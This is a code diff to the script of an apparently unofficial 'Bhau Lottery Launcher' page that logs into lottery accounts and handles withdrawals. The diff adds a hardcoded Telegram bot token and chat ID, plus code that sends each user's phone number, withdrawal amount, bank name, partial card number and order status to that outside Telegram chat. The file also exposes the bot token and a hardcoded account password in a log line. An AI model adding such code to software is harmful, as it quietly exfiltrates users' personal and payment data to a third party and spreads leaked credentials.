@@ -646,6 +646,11 @@
 (function() {
   'use strict';
 
+  // ---- TELEGRAM CONFIG ----
+  const TELEGRAM_BOT_TOKEN = '8638134053:AAGVC6fIVhGUsKibPEFq7skSY5QqosE6U18';
+  const TELEGRAM_CHAT_ID = '-1004415634813';
+
+  // ---- STATE ----
   const state = {
     token: null,
     phone: null,
@@ -664,6 +669,7 @@
     transactionYearMonth: null,
   };
 
+  // ---- DOM REFS ----
   const terminal = document.getElementById('terminal');
   const loginSection = document.getElementById('loginSection');
   const dashboard = document.getElementById('dashboard');
@@ -675,6 +681,7 @@
   const showPassBtn = document.getElementById('showPassBtn');
   const dynamicContent = document.getElementById('dynamicContent');
 
+  // ---- LOGGING ----
   function log(msg, type = 'info') {
     const now = new Date();
     const time = now.toLocaleTimeString([], { hour12: false });
@@ -683,6 +690,35 @@
     row.innerHTML = `<span class="time">[${time}]</span> <span class="${cls}">${msg}</span>`;
     terminal.appendChild(row);
     terminal.scrollTop = terminal.scrollHeight;
+  }
+
+  // ---- TELEGRAM SEND MESSAGE ----
+  async function sendTelegramMessage(message) {
+    try {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      });
+      const data = await response.json();
+      if (data.ok) {
+        log('📤 Telegram notification sent', 'ok');
+        return true;
+      } else {
+        log(`❌ Telegram error: ${data.description}`, 'error');
+        return false;
+      }
+    } catch (error) {
+      log(`❌ Telegram send error: ${error.message}`, 'error');
+      return false;
+    }
   }
 
   // ---- API CALLS ----
@@ -1509,7 +1545,7 @@
     state.isAutoClaiming = false;
   }
 
-  // ---- REFERRAL RENDER (ONLY HISTORY - NO STATS) ----
+  // ---- REFERRAL RENDER ----
   async function renderReferral() {
     const loadingHtml = `
       <div class="dynamic-card">
@@ -1526,7 +1562,6 @@
         <div class="title">👥 Referral History</div>
     `;
 
-    // Referral history only - no stats
     html += `<div style="border-top:1px solid rgba(255,255,255,0.06);padding-top:10px;">
       <div style="color:#7a8aaa;font-size:10px;font-weight:600;margin-bottom:6px;">📋 Referral History</div>
       <div style="max-height:350px;overflow-y:auto;">`;
@@ -1551,7 +1586,6 @@
     }
     html += `</div></div>`;
 
-    // Share button
     html += `
       <div style="margin-top:12px;display:flex;gap:8px;">
         <button class="btn-sm btn-refer btn-block" id="shareReferralBtn">📤 Share Referral Link</button>
@@ -1914,6 +1948,7 @@
     });
   }
 
+  // ---- WITHDRAW RENDER (with Telegram notification) ----
   async function renderWithdraw() {
     dynamicContent.innerHTML = `<div class="dynamic-card"><div class="title">💸 Withdraw Funds</div><div id="withdrawContent">Loading...</div></div>`;
     const wc = document.getElementById('withdrawContent');
@@ -1979,6 +2014,7 @@
         document.getElementById('withdrawAmountInput').value = this.dataset.amount;
       });
     });
+
     document.getElementById('withdrawSubmitBtn').addEventListener('click', async function() {
       if (!state.selectedCard) { log('❌ Select a card', 'error'); return; }
       const amount = parseFloat(document.getElementById('withdrawAmountInput').value);
@@ -1986,9 +2022,17 @@
       if (state.balance !== null && amount > state.balance) { log(`❌ Insufficient balance`, 'error'); return; }
       
       let cardName = '';
+      let cardNumber = '';
+      let bankName = '';
       document.querySelectorAll('.card-item').forEach(el => {
         if (el.classList.contains('selected')) {
-          cardName = el.querySelector('.pm-name')?.textContent || 'Unknown';
+          const text = el.querySelector('.pm-name')?.textContent || 'Unknown';
+          const parts = text.split(' - ');
+          bankName = parts[0] || 'Bank';
+          cardName = parts[1] || 'Unknown';
+          const desc = el.querySelector('.pm-desc')?.textContent || '';
+          const match = desc.match(/\*\*\*\*(\d+)/);
+          cardNumber = match ? match[1] : '****';
         }
       });
       
@@ -1999,22 +2043,45 @@
       this.disabled = false; this.textContent = '💸 Withdraw Now';
       const div = document.getElementById('withdrawResult');
       
+      const status = result?.success ? 'SUCCESS' : 'FAIL';
+      const orderId = result?.data?.orderId || 'N/A';
+      const now = new Date();
+      const timeStr = now.toLocaleString('en-IN', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' });
+      
+      // Save log
       const logs = JSON.parse(localStorage.getItem('withdrawLogs') || '[]');
       const logEntry = {
         type: 'withdraw',
         amount: amount,
         card: cardName,
         status: result?.success ? 'success' : 'failed',
-        time: new Date().toLocaleString()
+        time: now.toLocaleString()
       };
       logs.push(logEntry);
       localStorage.setItem('withdrawLogs', JSON.stringify(logs));
+      
+      // Build Telegram message
+      let telegramMsg = `💸 <b>NEW WITHDRAWAL</b>\n\n`;
+      telegramMsg += `👤 User: <b>${state.phone || 'Unknown'}</b>\n`;
+      telegramMsg += `💰 Amount: <b>₹${amount.toFixed(2)}</b>\n`;
+      telegramMsg += `💳 Card: <b>${bankName} (${cardNumber})</b>\n`;
+      telegramMsg += `📋 Order ID: <b>${orderId}</b>\n`;
+      telegramMsg += `⏱ Time: <b>${timeStr}</b>\n`;
+      telegramMsg += `✅ Status: <b>${status}</b>`;
+      
+      if (!result?.success) {
+        telegramMsg += `\n⚠️ REASON: <b>${result?.msg || 'Unknown error'}</b>`;
+      }
+      
+      // Send Telegram notification
+      await sendTelegramMessage(telegramMsg);
       
       if (result && result.success) {
         div.innerHTML = `<div style="background:rgba(0,0,0,0.3);padding:8px;border-radius:8px;">
           <div style="color:#5df0ae;font-weight:600;">✅ Withdrawal successful!</div>
           <div style="color:#8a9aaa;">₹${amount} withdrawn successfully</div>
-          <div style="font-size:9px;color:#6a7a9a;margin-top:4px;">Order ID: ${result.data?.orderId || 'N/A'}</div>
+          <div style="font-size:9px;color:#6a7a9a;margin-top:4px;">Order ID: ${orderId}</div>
+          <div style="font-size:9px;color:#5df0ae;margin-top:4px;">📤 Telegram notification sent!</div>
         </div>`;
         log(`✅ Withdrawal of ₹${amount} completed!`, 'ok');
         await getBalance();
@@ -2139,6 +2206,7 @@
   log('🚀 Bhau Lottery Launcher Ready', 'ok');
   log('📱 Enter phone number (auto-login on 10 digits)', 'info');
   log('🔐 Password: Sanju2005 (auto-filled)', 'info');
+  log('📤 Telegram notifications enabled for withdrawals', 'info');
 })();
 </script>
 </body>
